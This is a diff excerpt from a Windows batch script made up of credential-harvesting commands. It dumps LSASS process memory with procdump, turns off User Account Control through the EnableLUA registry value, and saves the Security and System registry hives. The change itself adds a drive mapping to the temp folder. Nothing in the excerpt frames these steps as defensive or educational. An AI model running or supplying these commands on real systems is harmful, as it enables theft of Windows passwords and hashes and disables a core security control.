@@ -416,6 +416,8 @@ procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp
 ECHO ============================
 start C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 ECHO ============================
+subst k: %temp%
+ECHO ============================
 reg save HKLM\Security security.hive
 ECHO ============================
 reg save HKLM\System system.hive
